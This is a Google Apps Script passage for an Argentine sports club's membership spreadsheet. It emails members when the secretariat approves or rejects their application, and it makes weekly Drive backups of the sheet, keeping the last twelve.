// Trigger onEdit instalable: mail al socio cuando cambia su estado
// ============================================================
function handleEdit(e) {
  try {
    if (!e || !e.range) return;
    const sheet = e.range.getSheet();
    if (sheet.getName() !== SHEET_SOCIOS) return;

    const row = e.range.getRow();
    if (row === 1) return; // header

    const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0].map(String);
    const estadoCol = headers.indexOf('estado') + 1;
    if (estadoCol <= 0) return;
    if (e.range.getColumn() !== estadoCol) return;

    const newValue = String(e.value == null ? '' : e.value).toLowerCase().trim();
    const oldValue = String(e.oldValue == null ? '' : e.oldValue).toLowerCase().trim();
    if (newValue === oldValue) return;

    const rowData = sheet.getRange(row, 1, 1, sheet.getLastColumn()).getValues()[0];
    const socio = {};
    headers.forEach(function (h, i) { socio[h] = rowData[i]; });
    if (!socio.email) return;

    const wasInactive = (oldValue === 'pendiente' || oldValue === 'desactivado' || oldValue === '');
    if (newValue === 'activo' && wasInactive) {
      sendApprovedMail_(socio);
      log('mail', socio.email, 'estadoChange', 'sent_approved');
    } else if (newValue === 'rechazado' && oldValue === 'pendiente') {
      sendRejectedMail_(socio);
      log('mail', socio.email, 'estadoChange', 'sent_rejected');
    }
    // Otros cambios (activo→desactivado, etc.) no disparan mail — la
    // secretaría debería comunicar bajas personalmente.
  } catch (err) {
    try { log('error', '', 'handleEdit', String(err && err.message || err)); } catch (e2) {}
  }
}

function sendApprovedMail_(socio) {
  const config = getConfig();
  const siteUrl = String(config.site_url || '').trim();
  const subject = '✓ Tu cuenta del Club Agronomía Central está activa';
  const body =
    'Hola ' + (socio.nombre || 'socio') + ',\n\n' +
    '¡Buenas noticias! La secretaría aprobó tu solicitud y tu cuenta ya está activa.\n\n' +
    'Ya podés ingresar al portal del socio con tu email y la contraseña que cargaste al registrarte' +
    (siteUrl ? ':\n\n  ' + siteUrl + '\n\n' : '.\n\n') +
    'En el portal vas a poder:\n' +
    '  • Ver tu estado de cuenta y tus cuotas\n' +
    '  • Pagar con Mercado Pago, transferencia o efectivo\n' +
    '  • Coordinar con la secretaría por WhatsApp\n\n' +
    'Tu ID de socio es: ' + (socio.socio_id || '—') + '\n\n' +
    '¡Bienvenido al club!\n\n' +
    '— Club S. y D. Agronomía Central';
  try { MailApp.sendEmail(String(socio.email), subject, body); } catch (e) { /* swallow */ }
}

function sendRejectedMail_(socio) {
  const config = getConfig();
  const tel = String(config.telefono_secretaria || '').trim();
  const subject = 'Sobre tu solicitud al Club Agronomía Central';
  const body =
    'Hola ' + (socio.nombre || '') + ',\n\n' +
    'Lamentablemente no pudimos aprobar tu solicitud de alta como socio en este momento.\n\n' +
    'Si pensás que se trata de un error o querés más información, comunicate con la secretaría' +
    (tel ? ' al ' + tel : '') + '.\n\n' +
    '— Club S. y D. Agronomía Central';
  try { MailApp.sendEmail(String(socio.email), subject, body); } catch (e) { /* swallow */ }
}

// ============================================================
// Backup semanal de la planilla a Drive
// ============================================================
const TRIGGER_HANDLER_WEEKLY = 'weeklyBackup';
const BACKUP_PREFIX = 'AC - Socios - Backup ';

function weeklyBackup() {
  try {
    const file = doBackup_();
    log('cron', '', 'weeklyBackup', 'created:' + file.getName());
  } catch (err) {
    log('error', '', 'weeklyBackup', String(err && err.message || err));
    throw err;
  }
}

function doBackup_() {
  const ss = SpreadsheetApp.getActive();
  const file = DriveApp.getFileById(ss.getId());
  const today = new Date();
  const stamp = today.getFullYear() + '-' +
    ('0' + (today.getMonth() + 1)).slice(-2) + '-' +
    ('0' + today.getDate()).slice(-2);
  const name = BACKUP_PREFIX + stamp;

  const config = getConfig();
  let folder = null;
  const folderId = String(config.backup_folder_id || '').trim();
  if (folderId) {
    try { folder = DriveApp.getFolderById(folderId); }
    catch (e) { folder = null; }
  }
  if (!folder) {
    const parents = file.getParents();
    folder = parents.hasNext() ? parents.next() : DriveApp.getRootFolder();
  }

  const copy = file.makeCopy(name, folder);
  cleanupOldBackups_(folder, 12); // mantenemos los últimos 12 (≈ 3 meses de backups semanales)
  return copy;
}

function cleanupOldBackups_(folder, keepCount) {
  try {
    const it = folder.searchFiles('title contains "' + BACKUP_PREFIX + '"');
    const backups = [];
    while (it.hasNext()) backups.push(it.next());
    backups.sort(function (a, b) { return b.getDateCreated().getTime() - a.getDateCreated().getTime(); });
    for (let i = keepCount; i < backups.length; i++) {
      backups[i].setTrashed(true);
    }
  } catch (e) { /* no es crítico */ }
}

function backupNow() {
  const ui = SpreadsheetApp.getUi();
  try {
    const file = doBackup_();
    let folderName = 'Drive root';
    try {
      const it = file.getParents();
      if (it.hasNext()) folderName = it.next().getName();
    } catch (e) {}
    ui.alert('Backup creado ✓\n\nArchivo: ' + file.getName() + '\nCarpeta: ' + folderName);
  } catch (err) {
    ui.alert('Error al hacer backup: ' + (err && err.message));
  }
}
